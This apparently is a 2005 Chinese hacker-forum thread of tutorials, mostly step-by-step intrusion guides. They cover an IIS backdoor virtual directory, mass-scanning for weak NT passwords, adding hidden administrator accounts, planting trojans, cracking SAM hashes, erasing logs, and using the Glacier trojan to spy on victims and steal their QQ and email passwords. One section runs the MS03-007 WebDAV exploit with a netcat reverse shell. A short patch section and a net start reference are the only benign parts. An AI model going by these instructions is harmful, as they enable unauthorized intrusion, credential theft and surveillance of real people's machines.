不要告诉我你不知道上面的输出是什么！！！！ 
现在我们心里已经有底了，是不是！呵呵 管理员要倒霉了 

3. mkdir c:\inetpub\wwwroot\dir1 
4. cscript.exe mkwebdir.vbs -c MyComputer -w "Default Web Site" -v "Virtual Dir1","c:\inetpub\wwwroot\dir1" 
这样就建好了一个虚目录：Virtual Dir1 
你可以用 1 的命令看一下 
5. 接下来要改变一下Virtual Dir1的属性为execute 
cscript.exe adsutil.vbs set w3svc/1/root/Virtual Dir1/accesswrite "true" -s: 
cscript.exe adsutil.vbs set w3svc/1/root/Virtual Dir1/accessexecute "true" -s: 
现在你已经可以upload 内容到该目录，并且可以运行。你也可以把cmd.exe net.exe直接拷贝到虚拟目录的磁盘目录中。 

6. 以下命令通过修改iis metabase 来迫使iis以本身的安全环境来创建新的CGI process 

Cscript adsutil.vbs set /w3svc/1/root/[your directory]/createprocessasuser false 


注释：cscript windows script host. 

adsutil.vbs windows iis administration script 

后面是 iis metabase path 


这样的后门几乎是无法查出来的，除非把所有的虚目录察看一遍（如果管理员写好了遗书，那他就去查吧） 

大家不可以用来做非法的攻击，一切后果自负 








--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 12:08pm 

入门者如何获得肉鸡 


入门者如何获取肉鸡（跳板） 

入门者如何获取肉鸡（跳板）
今天我们来讲一讲一些简单的入侵，这篇文章是送给新手的，难的文章我也写不出来~~ 这里讲的方法都是针对winnt和2000的，平台是2000。我只是想送给新手点肉鸡罢了。 

罗嗦了这么多，现在我们开始吧~。首先我们来对几个扫描器评点一下什么？你不知道扫描器是什么？我晕~~~扫描器就是扫描的嘛，它可以检测出主机的漏洞！ 
常见的有端口扫描器，和cgi漏洞扫描器，还有就是象流光那样的大型扫描器，什么都可以扫。我们先来讲一下扫描器的原理！ 
现在假设你是A，要扫的是B 
那么，通常建立3次握手的过程是 
A--------Syn------->B 
A<-----Syn/Ack------B 
A-------Ack-------->B 
这样就建立了连接,扫描就是建立很多这样的,从而达到了解对方开了哪些端口,哪些服务厉害的扫描器还会进一步探测!但是,这种tcp扫描会留下大量的记录,如果B的网管不是注意文明用语那么他就会开始注意你了!! 
所以我们又会用半开放式扫描(syn) 
也就是 
A--------Syn------->B 
A<-----Syn/Ack------B 
A------->\\ B 
A-connected--?<-----B 
这样,由于B一直得不到确认,当然就不会记录ip啦,不过B若是很bt,那么他也会记录任何syn的 ip,那就没办法了!! 

扫描的原理讲完了,现在来讲讲几个扫描的工具!!这才是重点,新手哪会关心 

那原理啊~~~ 我们先来讲端口扫描器一个端口就是一条路,进入系统的的路!可见他的重要!! 
我推荐用superscan和nscan两个都是国外的,superscan的汉化版有问题,建议去www,peckerland.com下载E文版 
nscan在黑白有下! 这两个的界面简单,我就不罗嗦了!我很喜欢superscan.他的扫描准且快~~对单一端口的大规模扫描也很不错,以前大家就是用它来扫3389的! 

下面我来介绍流光!!xscan!!和sss!!! 我想大家对流光应该不陌生吧!如果你是新手,先从流光开始!!界面很cool!多亏榕哥~~不过我宁可把流光作为一个攻击的工具而不是扫描的工具xscan则是安全焦点的,他可以半开放式扫描!! 
而且在扫描上我觉得比流光好!因为我问过sharkstorm,他说流光会在对方主机上留下痕迹,所以我怀疑流光用的是tcp扫描! 所以我现在用大规模扫描时是用xscan而不是流光! 接下来是sss,现在的最新版是3.43,在www.peckerland.com上有3.41版和注册机. 
他是由redshadow开发的,全称shadow security scanner他能扫描很多漏洞,速度也很快,留下的痕迹少,产生报告详细.有时候流光或是国内一些扫描器会误报,这时我常用他来检测.所以,在入侵单一机器时,我用的就是它!!!! 
好累啊,先喝口茶~~~下面就讲怎样获得大量肉鸡! 这里我推荐用扫描nt弱口令的方法! 当然也许别人会推荐扫描sql的弱口令,但网上的nt弱口令真的比sa为空的要多太多了~~ 我们先打开流光4->扫描->简单扫描->nt/98->IP段开始扫,扫到很多139开了的主机然后ipc主机,右键->探测->远程探测用户然后就会有很多用户和共享被扫出来,其中有可能包括弱口令(参见杀手的流光教程)这里我告诉大家一个秘诀,就是有很多是guest为admin权限的,这些的密码一般为空这是因为这台主机被攻破过,有人留下了后门,这下便宜我们了,先拿来用了再说! 
前面我们说过,我不喜欢用流光来扫描,所以,我们在这里用xscan来扫描nt弱口令! 在扫描选项里选nt弱口令,然后来个ip范围,让他扫,接下来就可以等待战果了一般会很丰硕,我每次扫这个都很爽!!! 接下来就要讲怎么用了!前面提到过我喜欢用流光来攻击,现在就让我们看看他的强大!! 流光4->工具->nt/iis工具->nt远程管道命令输入ip,刚才扫到的用户名,密码(若为空则不填) 连接! 
ntcmd>net user 
看看,连上了吧~~ 
我们来添加一个用户名 
ntcmd>net user aaa 123 /add 
命令成功完成 

加到administrators组 
ntcmd>net localgroup administrators aaa /add 
命令成功完成 

好了,这样肉鸡就做好了.什么?你想把他作成跳板? 好的,我们继续来 
流光4->工具->nt/iis工具->ipc种植者 
添上ip,用户名,密码等 
然后点开始 
接下来我们再用telnet连上去,去debug snake的sksockserver注意，用ntcmd 

不能安装sksockserver。 
具体我就不说了,大家自己参考说明. 

当然,大家也可以放一堆后门上去. 
不过我喜欢这样 
ntcmd>net use g: \\ip\c$ 
命令成功完成 

这样,我们就把他的c盘映射成了我的g盘。然后我再放个木马的server上去再用ntcmd运行,呵呵搞定~~,玩他没商量!!! 
我们还可以把c;\winnt\repair\sam._抓下来,用lc3跑一下 就得到所有用户的密码,或是用木马抓密码!! 
当然我们也可以telnet上去运行tlntadmn来修改telnet端口，更隐蔽怎么扩大战果呢?我们仍用ntcmd 
ntcmd>net view 
...... 
出来很多机器名,这是和我们的肉鸡共享的 
比如有一台是 
\\LOVE 
我们就 
ntcmd>ping -a LOVE 
这样就得到了他的ip 
我一般会用sss再扫一次 
当然,你也可以用你得到的密码去试试,看能不能进去,呵呵 

有一次,我"不小心"跑到某教育部门,net view一下,居然和教育局挂钩....接下来出于自身安全,我就停住了,呵呵,中国的政府不能乱搞的~~~ 

最后是打扫脚印,建议用小榕的cleaniislog,很方便,用法参见说明! 请记住,入侵nt的首选绝对是139,netbios 

补充一点,大家在连接时可以用2000自带的计算机管理->连接到计算机这样也很方便. 

关于其他几种方法，我在这里说明一下 

输入法基本上绝种了~~ 不过如果你扫大量的肉鸡也许还有最好用的应该数sql的sa为空，直接用流光连就行了，连上后就可以直接添加帐号等，但是有一点不好有时候会连不上。比如我在学校机房就从来没连上过，估计是我在内部网络，有硬防火墙的原因，我在3389上就连的很好。不过总是玩这个是不会提高的！其次要说明的就是idq溢出与.printer的漏洞，这两个漏洞我不想多说什么，因为很多人都会用但成功不了，我在这里就说说什么情况下可以成功。一般来说，用xscan扫描，如果出现说isapi扩展，那么恭喜你，如果存在这两个漏洞绝对成功，我屡试不爽。因为这两个漏洞都与iis那个破东西息息相关，所以大家不要被别的扫描器的误报迷惑，在安焦的漏洞库有这两个漏洞的详细说明。 

关于unicode漏洞请参见ncc写的教程 

流光是一个很好的攻击工具,他的exploits文件夹和tools文件夹的东西大家漫漫体会,呵呵。不说了,不然天下大乱了!! 

总之,98的安全性比2000好,因为98基本上没用 一般来说,入侵98是从139,要改自己的lmhosts文件来达到入侵的目的! 不过我劝新手不要沉迷在我讲的方法中,虽然你能从中的到很多肉鸡,但是绝对不要做简单重复的工作 当有了一定水平后要去玩linux,unix,不然水平不会提高. 我写这篇文章的目的是让大家学习,请不要破坏,若是因此引起的一切后果本人概不负责!! 








--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 12:08pm 

流光的使用方法 


窍门一: 

1.很多人都有使用流光4.71之前版本的经验,不过现在请下载流光5.0内部测试版.地址: 

http://www.netXeyes.com 安全焦点 

http://www.swed.com.tw/xiaonu/f.rar 小奴私人下载 

下载后解压安装! 解压密码在说明文件里..
(强烈建议查看readme文档再安装撒...) 

安装后打上时间补丁...请把补丁放在同一个文件夹里. 

2.如果没有安装时间补丁一打开流光就会出现:"[流光5.0]已过期,请到http://www.netXeyes.com下载最新版本" 

3.如果安装了时间补丁,你可以打开5.0.但是还是会出现"[流光5.0]已过期,请到http://www.netXeyes.com下载最新版本"...这时我们就要用到特别的方法来防止流光5.0过期了... 

4.(仔细..再仔细)如果你有金山网标或者天网之类的防火墙的话...恭喜你.你就快成功了..小榕设计流光5.0内部测试版的时候会让打开主程序就会自动访问四个IP地址.
第一个是61.166.33.214 -- 云南省 楚雄市
第二个是218.30.12.185 -- 陕西省 西安市 (可能会变)
第三个是61.166.33.214 (跟第一个一样)
第四个是66.94.230.45 -- 美国(可能会变..这个很"阴险"大概在前面三个IP过后20秒左右它才出现) 

防火墙首先禁止前面四个IP连接.(直接点击禁止就可以了)... 

四个IP过后随便你扫什么都不会有限制.如果这时防火墙询问你是不是允许流光5.0访问**.**.**.**(ip)?? 当然点击允许啦...要不怎么扫?? 

4.流光5.0增强了SENSOR的扫描属性.很强大...特别是"TELNET ip 控制端口"和数据包转发功能我佩服得7体投地...自带有说明文件.大家看看就知道了.(我在这里就不废话了撒...呼呼)
_________________________________ 


窍门二: 

还有一个比较"失败"的方法.打开补了丁的流光之前首先关闭网络连接,即不要上网.过1分钟以后再打开网络连接...这时你就可以无忧用5.0了..(这样做是防止一开流光5.0就访问指定IP)
_________________________________ 

窍门三: 

听"新丁"(我在黑基的兄弟)说更改流光的图标也可以防止过期提示,我没试过.大家试试..
_________________________________ 

TNND...酒气冲头.难受死了...坚持搞完..
_________________________________ 

友情提醒: 

1.如果你是天网防火墙请把"属性设置"--"自动允许每个程序运行并记录日志"(好像是这样吧)的勾去掉...这样就可以拦截流光运行时访问的IP地址了.. 

2.流光5.0由于是内部测试版本,所以不限制国内IP扫描.请千万不要!不要!!不要!!!扫国内IP!尽量多种植SENSOR到你的外国肉鸡上帮你扫撒....(呼呼,我最喜欢做的事) 

3.流光5.0太强大.扫描的IP段尽可能少点...这个版本中包含了工具ARP Netwok Sniffer,这是一个基于ARP SPOOF的工具，有可能会造成目标网络出现故障甚至于中断，在使用的时候不要指定过于大的IP范围。推荐不要超过32台主机。--- 引用 

不要把自己的机子都搞死了!同时尽量不要使用"网络嗅探"功能. "要知道在一个100M的环境中的流量是非常大的，所以请首先确定您自己的主机是否有足够的带宽接收传输数据" --- 引用! 

___________________________________ 

某些醉话... 

1.很多人扫描的时候会扫到用户:root:空 admin:同 administrator:同 wwwadmin:同 等同时存在于一个IP的现象.但是建立IPC连接的时候却失败. 

注意:这些是虚报...请你点击"选项(o)"---"IPC用户列表选项(I)"----把"如果主机不允许列出用户则强制从以下文件导入"的选项去掉...这样你扫描出来的用户就不会虚报了... 

2.扫描的时候要注意时间...要想到国外的时间跟我们有差异...如果你特别喜欢在我们的下午4点扫美国的IP段...那我没话可说! 

3.不要扫描自己不会利用的漏洞和端口...反正自己不会用,扫又浪费时间...(如果你打算学习怎么利用...那鼓励你扫!) 

4.流光的综合性很强!注意看每一项选项内容,自己摸索更好的综合扫描办法,.... 

玩木马 


如果你是高手，看了这篇文章你会觉得无聊，如果你是菜鸟（和我一样菜的话）或者会有点用。哪个人不爱玩？给我站出来！我要狠狠的KKKKK他一顿。5555.........好了，闲话少说为好，转入正题吧。首先我用到的工具主要是两个，1.扫描工具：代理猎手，2.冰河2.2客户端。（哪里有下载？自己找吧）下面分两步走：
一.扫描篇：
双击桌面上的代理猎手快捷图标，进入代理猎手主操作台.点击左上角三角形下面的“搜索任务”，点击下面的“添加任务”，进入“添加搜索任务”窗口，任务类型选“搜索网址范围”，按“下一步”，进入地址范围窗口，接着按右边的“添加”，在弹出的窗口中，地址范围类型选“起止地址范围”，起止地址填上你要扫描的IP段（例如61.150.0.0）结束地址填上例如（61.150.255.255），按“确定”，见到我刚才填的IP段出现在窗口中。接着按“下一步”，进入端口和协议窗口，按右边的“添加”，在弹出的小窗口中选“单一端口”，下面数字框中填上冰河的默认端口7626协议选“HTTP”，在旁边的“必搜”前打上钩。按“确定”，就看到了我刚才填的端口和协议出现在窗口中，按“完成”，这时回到添加前的窗口。看到框框中已有了我刚才填的内容 ，左上角的三角形也由开始的灰色变了现在的蓝色，这时按下这个三角形就开始了我的第一次搜索任务（这时操作台下面的数字会不停的跳动，表示正搜索中），这时按下红色停止按钮下面的“搜索结果”按钮，就看到了搜索的结果，如果有端口7626开的机器扫到，就会在窗口中显示该机的IP地址，(验证超时那些先不要理它,反正它的端口7626是打开了),如果你选IP段好运的话，很快就会有机器被你扫描到！你不仿等到扫描到的机器有多几个时才停止扫描，这样你进别人的机器跳舞的机会就大大提高了！如果你真的那么倒霉扫不到的话，就换IP段来搜吧.不过要记住把先前的搜索任务删除掉再添加新的搜这里有一点要告诉你，代理猎手的其他设置你先不要搞（其余都是默认的），就按我上面提到的做就行了！好了，扫描到了一大堆的IP了，GO GO GO 进入主要的一步了。。。。。 

二。连接篇:
运行冰河2.2客户端,进入操作台,点击左上角"添加主机"按钮,在弹出的窗口中,显示名称处填上我刚才扫描到的IP,密码先不填,端口填默认的7626.按"确定",这时看到了填入的IP出现在主操作台左边的窗口中了.重复上面的这一步,把扫描到的IP全部都填进去(省去了等一下连接一个填一次的麻烦),看到了所有的IP都填进去后,就开始了我们的第一次入侵(这里有一点要提醒一下的是,你在连接前一定要把你的防火墙和病毒监控关了).好了,双击操作台左边看到的IP,下面的状态条会滚动,等待一下,看看返回来什么信息.如果是"主机没有响应"或者"无法与主机连接",试多几次,还是一样的话,可能对方已离线或打开7626端口的不是冰河的服务端,就选下一个IP.好了,这个能连接,但返回的信息是"口令有误..."那这个我可以搞店了,先试冰河的通用密码,具体操作如下:右键点击该IP,在弹出菜单中选"修改",进入刚才添加IP的窗口,在"访问口令"处填上你所选的通用密码,按"确定".再到主操作台上"当前连接"的下拉菜单中找到你刚才修改了口令的IP,点击一下,看到"访问口令"处出现了多个"*******"号,这就是你填上的冰河通用密码了,再按一下旁边的"应用",再双击操作台左边该IP,就尝试再次连接,当看到"正在接收数据""完成"等字样时,呵呵,你已成功了.这部机你有了一切的操纵权了.看到了他的机器的分盘(C.D.E.F.G.等)在右边的屏幕中出现了,双击这个小图标,你就可以看到他的硬盘中的文件夹列表和文件,再通过用鼠标右键点击文件夹或文件,你就可以使用"复制","粘贴",删除","下载"等等功能了,你也可以上传一个文件给他远程打开,呵呵.如果你上传的是另一个木马,那他的机就又多中了一个马儿了..具体做什么自己想吧.去看看他在干什么吧,点击操作台上方"查看屏幕"按钮,图象格式处选"JPEG",(因为JPEG图象传输速度比BMP的传输速度要快),按确定,等一下一个小的屏幕就出来啦,这个就是对方的屏幕画面了,右键点击该小屏幕,在"自动跟踪"和"自动缩放"前打上钩,那么这个小屏幕就会跟随对方的屏幕变化而变化了.再去点击"命令控制台",看到各个命令类按钮,双击各个按钮会有不同的命令出了,你可以在"口令类命令"下的"历史口令"处查看他的QQ密码,上网密码等等,在"设置类命令"下的"服务器配置"中读取该冰河服务端的配置信息,也就是刚才阻档你连接的设置了的密码,要是对方有设置IP邮寄的话你也可以看到他的信箱号,用这个密码你或许能破了他的信箱(我用这个方法也真的破了好几个人的信箱哦,呵呵),你也可以修改了他的配置,换了你自己的密码和邮寄信箱.你也可以帮他的硬盘创建共享.以后他把冰河杀了你也可以用共享连接他啊!(等于给自己多留了个后门)其他功能就不说了,你自己慢慢去尝试吧!
还有一种情况,就是你尝试了所有的通用密码都不能连接的话,就试试小飞刀原创的冰河漏洞吧,具体操作如下:当你用完了通用密码后还是显示"密码有误......",就去点击操作台窗口中的"我的电脑",在你的文件中找到你的冰河服务端,右键点选"远程打开",这时你依然看到是"密码有误....",但马上又多了一条传输进度条出来,显示正在传送文件,当看到了进度条完成后,下面的提示也变了,会显示"文件传送完毕"和"文件打开成功".这样你就可以不用密码连接进去了.(记住要先把你刚才填进去的密码删了,按"应用".当返回的信息是"文件传送完毕"和"文件打开失败"时,你可以上传其他的木马服务端(例如黑洞,公牛等等木马都可以)上去,这样也可以控制对方,但已不是用冰河客户端了,而是换了相对应的木马客户端.
咳咳........进去后可别干坏事哦! 

其实玩了这么多的木马还是觉得冰河是再好用的(呵呵.这只是个人观点,你有好用的木马就告诉我一声吧),功能多多,易用,而且中冰河的机器也是再多的.其他功能就不一一说了..(呵呵呵.水平有限,看了可别笑掉牙,我可没钱给你补牙) 








--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 12:08pm 

溢出专集 


2003年3月18日，微软发布MS03-007号安全公告：Microsoft IIS 5.0 WebDAV远程溢出漏洞，声称利用此漏洞溢出后可以得到localsystem权限，于是网上沸沸扬扬开始关注起此漏洞。到了3月下旬，发现此漏洞的老外发布了他的exploit，不过由于这个exploit是针对英文版的win2000的，所以对国内造成的影响不大。直至3月27日，国内某黑客在安全焦点上公布了其修改后的针对中文版win2000的此漏洞的exploit程序，于是第二天即3月28日，国内的各个黑客网站都纷纷提供了编译好的win平台下的WebDAV漏洞溢出攻击程序的下载，各个安全论坛便随处可见关于WebDAV远程溢出攻击的讨论，甚至更有甚者把溢出攻击过程做成了动画教程供人观摩，WebDAV漏洞溢出攻击在一夜之间"迅速走红"。而且，其攻击代码在3月29日时又被人改进，使其成功率又大幅提高，眼下WebDAV远程溢出攻击已经成为各种黑客最流行的攻击方法，其来势之迅速之猛烈是以前Unicode、printer等漏洞所不及，而且有被蠕虫制造者利用的可能，所以笔者认为有必要写此文章让广大网管和用户尽早了解这个漏洞情况及解决方案，以提高警惕、做好防范。
一、 漏洞基本情况
1、 漏洞名称及描述
名称：Microsoft Windows 2000 WebDAV远程缓冲区溢出漏洞
微软安全公告：MS03-007
Unchecked Buffer In Windows Component Could Cause Web Server Compromise(815021)
地址http://www.microsoft.com/technet/security/bulletin/MS03-007.asp
描述：IIS 5.0包含的WebDAV组件不充分检查传递给部分系统组件的数据，远程攻击者利用这个漏洞
对WebDAV进行缓冲区溢出攻击，可能以Web进程权限在系统上执行任意指令。
2、 受影响系统 


Microsoft IIS 5.0 
- Microsoft Windows 2000 Professional/Server/ 
Datacenter Server SP3 
- Microsoft Windows 2000 Professional/Server/ 
Datacenter Server SP2 
- Microsoft Windows 2000 Professional/Server/ 
Datacenter Server SP1 
- Microsoft Windows 2000 Professional/Server/ 
Datacenter Server 


3、 什么是WebDAV组件
Microsoft IIS 5.0 (Internet Information Server 5)是Microsoft Windows 2000自带的一个网络
信息服务器，其中包含HTTP服务功能。IIS5默认提供了对WebDAV的支持，WebDAV（基于Web的分布式写作和改写）是一组对HTTP协议的扩展，它允许用户协作地编辑和管理远程Web服务器上的文件。使用WebDAV，可以通过HTTP向用户提供远程文件存储的服务，包括创建、移动、复制及删除远程服务器上的文件，但是作为普通的HTTP服务器，这个功能不是必需的。
4、 漏洞产生的原因
这个漏洞产生的原因具体是由于WebDAV使用了ntdll.dll中的一些API函数，而这些函数存在一个缓
冲区溢出漏洞，而Microsoft IIS 5.0带有WebDAV组件对用户输入的传递给ntdll.dll程序处理的请求未作充分的边界检查，远程入侵者可以通过向WebDAV提交一个精心构造的超长的数据请求而导致发生缓冲区溢出，成功利用这个漏洞可以获得LocalSystem权限，这意味着入侵者可以获得主机的安全控制能力。所以确切地说，这个漏洞并不是IIS造成的，而是ntdll.dll里面的一个API函数造成的。也就是说，很多调用这个API的应用程序都存在这个漏洞。
5、 测试代码：见附件
WebDAV远程缓冲区溢出漏洞的基本情况我们这里介绍到这里了，如果读者有兴趣想进一步了解这个漏
洞具体的溢出原理分析，建议可以去安全焦http://www.xfocus.net/中参阅isno写的两篇关于WebDAV远程溢出漏洞分析的文章，很精彩！我这里就不班门弄斧了。 
二、如何检测漏洞
在上面介绍漏洞基本情况的时候，我们已经说了IIS 5.0的默认配置是提供了对WebDAV的支持，也就是说，如果你的win 2000提供了IIS服务而没有打过针对此漏洞的补丁，那么一般情况下你的IIS就会存在这个漏洞，但如何来确定呢？我们可以借助一些工具来帮我们进行检测。
1、 第一个检测工具：Ptwebdav.exe
下载地址http://www.ttian.net/txt/show.php?id=10
简介：Ptwebdav.exe是一个老外写的专门用来远程检测Windows 2000 IIS 5.0服务器是否存在WebDAV
远程缓冲区溢出漏洞的东东，其操作界面非常简单，只要在其"IP or hostname"中填入要检测的主机和IIS服务端口，然后按"check"就可以了。笔者正用它来检测本地主机是否存在WebDAV漏洞，一会儿它就会在下面窗口里显示结果。这个工具不错，但它每次只能检测一台机子，如果你想检测一个网段内所有主机就比较麻烦了，一台台地检测不知道要检测到什么时候。让我们来看看第二个检测软件，它能帮我们解决这个问题。
2、 第二个检测工具：WebDAVScan v1.0
下载地址http://www.cnhonker.net/Down/show.php?id=65&;;down=1
简介：WebDAVScan是一个专门用于检测网段内的Microsoft IIS 5.0服务器是否提供了对WebDAV的
支持的扫描器，软件非常小，只有7.23KB，而且是个绿色软件，无须安装，直接运行即可！扫描后如有此安全漏洞，软件会自动生成扫描报告，原来也是老外写的，不过我们这里用的是WebDAVScan的汉化版。笔者扫描X.X.23.1-X.X.23.254的网段大概用了30秒时间，速度很快，窗口右边显示的是结果，"Enable"表示了此IIS支持WebDAV，至于有没有漏洞要看它有没有打过补丁了。经笔者测试，这个软件确实很不错，推荐大家使用，好了，WebDAV的检测也介绍完了，下面我们开始讲利用此漏洞测试攻击了。
二、 漏洞测试攻击
自从WebDAV的exploit代码出现后，网上紧接着就出现了好几种版本的溢出攻击程序，虽然其核心
代码类似，但具体的功能和操作还是有些区别的，我们这里来了解两个WebDAV的溢出攻击程序。
1、 第一个溢出程序：wb.exe
下载地址http://www.longker.com/txt/opensoft.asp?soft_id=131&;;url=1
简介：wb.exe是一个win32平台下已经编译好的针对英文版的IIS--webdav远程溢出攻击
程序，原代码的作者是Crpt的kralor，使用时行用Netcat在本地监听某个端口，如nc -L -p 666，然后使用此程序对远程主机进行溢出攻击，溢出成功后就能在本地监听口上获取远程主机的反向连接，获取localsystem权限的cmdshell，它需要指定远程主机反向连接主机IP、端口、补丁信息等参数：syntax: c:\K_WEBDAV.EXE<victim_host><your_host><your_port>[padding]，如wb targetserver.com your_ip 666 3 ，攻击如果成功，那Netcat的监听窗口就会出现远程主机的shell。
2、 第二个溢出程序：webdavx.exe
下载地址http://www.longker.dom/txt/opensoft.asp?soft_id=135&;;url=1
简介：webdavx.exe是一个针对中文版server溢出程序，它是根据安全焦点Isno的perl代码编译成
的，这个版本只对中文版的有效，它的使用也不同于wb.exe，它溢出成功后直接在目标主机的7788端口上捆定一个localsystem权限的cmdshell，不像wb.exe需要反向连接，入侵者只要telnet到7788端口就可以了，所以用它在局域网内也能对局域网的主机进行攻击，当然wb.exe使用反向连接也有它的好处，因为许多WEB服务器的防火墙都设置为只允许通过到端口80的TCP连接，这样即使开了7788端口你也连接不上，而使用反向连接可以突破防火墙的TCP过滤，所以这两个软件各有用处各有特点，可以根据不同的需要进行选择。
3、 测试攻击实例
虽然讲了两个攻击软件的用法，但都只是纸上谈兵，我们还是来实际测试一下这个漏洞的威力如何！
我们测试的是中文版的IIS主机，使用的扫描软件是WebDAVScan的汉化版，攻击软件是webdavx.exe，为了输入方便，我把webdavx.exe改名为web.exe，在刚才介绍WebDAVScan 的时候我们已经扫描到的IIS支持WebDAV的主机中选一台，找开CMD,输入： 


c:\web 2x..x.23.68 
send buffer…(正在溢出) 

telnet target 7788(溢出完成，请尝试telnet连接目标主机的7788端口) 

c:\telnet 2x..x.23.68 7788 
正在连接到2x..x.23.68… 
Microsoft Windows 2000[Version 5.00.2195] 

<C>版权所有制1985-2000Microsoft Corp 
c:\winnt\system32> (溢出成功，已经连接到其7788端口) 


当然事情上溢出不一定成功，如果telnet连接提示失败就说明溢出可能不成功，这里是笔者N次试验的结果，不过现在webdavx.exe的溢出代码重新进行了改进，其溢出成功率大幅提高，估计在1/2左右。而且得到的应该是system权限，比超级用户还高一级，可以加个administrator组的成员来试试：
c:\winnt\system32>net user hacker 111111 /add 
The command completed successfully
C:\winnt\system32>net localgroup administrators hacker /add
The command completed successfully
命令成功了，看来System权限是真的了，那不是可在机器上干任何事情了？还真有点可怕！好了，我们这里只是测试，到此就停止吧！
三、 漏洞消除方案
我们上面已经看到了WebDAV远程溢出攻击的威力了吧，而到本文截稿为止，国内网络上的WebDAV远
程溢出攻击是越来越多了，你的IIS服务器一不小心就有可能被黑客攻击而成为被控制的傀儡，所以管理员和用户们千万不能大意，一定要尽快地堵上这个漏洞，千万不能再重演像MSSQL的远程溢出漏洞那样的惨痛教训了。具体的可以通过以下几个方案来解决：
⑴ 安装补丁，目前微软已经提供了此漏洞的补丁，下载地址http://microsoft.com/downloads/
details.aspx?FamilyId=C9A38D45-5145-4844-B62E-C69D32AC929B&displaylang=en 
或者，你也可以作用微软提供的IIS Lockdown工具来防止该漏洞被利用。 
⑵ 如果你不能立刻安装补丁或升级，也可以手工修补这个漏洞，我们上面已经说了WebDAV功能对一般的Web服务器来说并不需要，所以可以把它停止掉。WebDAV在IIS 5.0 WEB服务器上的实现是由Httpext.dll完成，默认安装，但是简单更改Httpext.ell不能修正此漏洞，因为WINDOWS 2000的WFP功能会防止系统重要文件破坏或删除。要完全关闭WebDAV包括的PUT和DELETE请求，需要对注册表进行如下更改：
启动注册表编辑器，搜索注册表中的如下键：
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W3SVC\Parameters 
找到后点击"编辑"菜单，点击"增加值"，然后增加如下注册表键值：
Value name: DisableWebDAV
Data typeWORD
Value data: 1
最后别忘了重新启动IIS，只有重启IIS后新的设置才会生效 








--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 12:09pm 

NET START可以起用命令一览表（上） 


Net start 
启动服务，或显示已启动服务的列表。两个或多个词组成的服务名，例如 Net Logon 或 Co 
mputer Browser，必须两边加引号 (")。 
net start [service] 
参数 
无 
键入不带参数的 net start 显示正在运行服务的列表。 
service 
包括 alerter、client service for netware、clipbook server、content index、comput 
er browser、dhcp client、directory replicator、eventlog、ftp publishing service、 
hypermedia object manager、logical disk manager、lpdsvc、media services managemen 
t, messenger、Fax Service、Microsoft install server、net logon、network dde、netw 
ork dde dsdm、nt lm security support provider、ole、plug and play、remote access 
connection manager、remote access isnsap service、remote access server、remote pr 
ocedure call (rpc) locator、remote procedure call (rpc) service、schedule、server 
、simple tcp/ip services、site server ldap service、smartcard resource manager、s 
nmp、spooler、task scheduler、tcp/ip netbios helper、telephony service、tracking 
service、tracking (server) service、ups、Windows time service 和 workstation。 
下面服务只有在 Windows 2000 上可用：file service for macintosh、gateway service 
for netware、microsoft dhcp service、print service for macintosh、windows interne 
t name service。 

Net start Alerter 
启动“警报器”服务。“警报器”服务发送警告消息。 
Net start Alerter 
Net start Client Service for NetWare 
启动“NetWare 客户服务”。该命令只有在安装了 NetWare 客户服务的情况下才能在 Wind 
ows 2000 Professional 上使用。 
net start "client service for netware" 
Net start ClipBook Server 
启动“剪贴簿服务器”服务。两个单词组成的服务名，例如 ClipBook Server，必须两边加 
引号 (")。 
net start "clipbook server" 

Net start Computer Browser 
启动“计算机浏览器”服务。 
net start "computer browser" 

Net start DHCP Client 
启动“DHCP 客户”服务。该命令只有在安装了 TCP/IP 协议之后才可用。 
net start "dhcp client" 

Net start Directory Replicator 
启动“目录复制程序”服务。“目录复制程序”服务将指定的文件复制到指定服务器上。两 
个词组成的服务名，例如 Directory Replicator，必须两边加引号 (")。也可以用命令 net 
start replicator 启动该服务。 
net start "directory replicator" 

Net start Eventlog 
启动“事件日志”服务，该服务将事件记录在本地计算机上。必须在使用事件查看器查看记 
录的事件之前启动该服务。 
net start Eventlog 

Net start File Server for Macintosh 
启动 Macintosh 文件服务，允许 Macintosh 计算机使用共享文件。该命令只能在运行 Win 
dows 2000 Server 的计算机上可用。 
net start "file service for macintosh" 
Net start FTP Publishing Service 
启动 FTP 发布服务。该命令只有在安装了 Internet 信息服务后才可用。 
net start "ftp publishing service" 
Net start Gateway Service for NetWare 
启动 NetWare 网关服务。该命令只有在安装了 NetWare 网关服务的情况下才能在 Windows 
2000 Server 上可用。 
net start "gateway service for netware" 
Net start Lpdsvc 
启动 TCP/IP 打印服务器服务。该命令只有在 UNIX 打印服务和 TCP/IP 协议安装后方可使 
用。 
net start lpdsvc 

Net start Messenger 
启动“信使”服务。“信使”服务允许计算机接收邮件。 
net start messenger 

Net start Microsoft DHCP Service 
启动 Microsoft DHCP 服务。该命令只有在运行 Windows 2000 Server 并且已安装 TCP/IP 
协议和 DHCP 服务的情况下才可用。 
net start "microsoft dhcp service" 

Net start Net Logon 
启动“网络登录”服务。“网络登录”服务验证登录请求并控制复制用户帐户数据库域宽。 
两个词组成的服务名，例如 Net Logon，必须两边加引号 (")。该服务也可以使用命令 net 
start netlogon 启动。 
net start "net logon" 

Net start Network DDE 
启动“网络 DDE”服务。 
net start "network dde" 
Net start NT LM Security Support Provider 
启动“NT LM 安全支持提供程序”服务。该命令只有在安装了“NT LM 安全支持提供程序” 
后才可用。 
net start "nt lm security support provider" 
Net start OLE 
启动对象链接和嵌入服务。 
net start ole 
Net start Print Server for Macintosh 
启动 Macintosh 打印服务器服务，允许从 Macintosh 计算机打印。该命令只能在运行 Win 
dows 2000 Server 的计算机上可用。 
net start "print server for macintosh" 
Net start Remote Access Connection Manager 
启动“远程访问连接管理器”服务。该命令只有在安装了“远程访问服务”后才可用。 
net start "remote access connection manager" 
Net start Remote Access ISNSAP Service 
启动“远程访问 ISNSAP 服务”。该命令只有在安装了“远程访问服务”后才可用。 
net start "remote access isnsap service" 
Net start Remote Procedure Call (RPC) Locator 
启动 RPC 定位器服务。“定位器”服务是 Microsoft Windows 2000 的 RPC 名称服务。 
net start "remote procedure call (rpc) locator" 

Net start Remote Procedure Call (RPC) Service 
启动“远程过程调用 (RPC) 服务”。“远程过程调用 (RPC) 服务”是 Microsoft Windows 
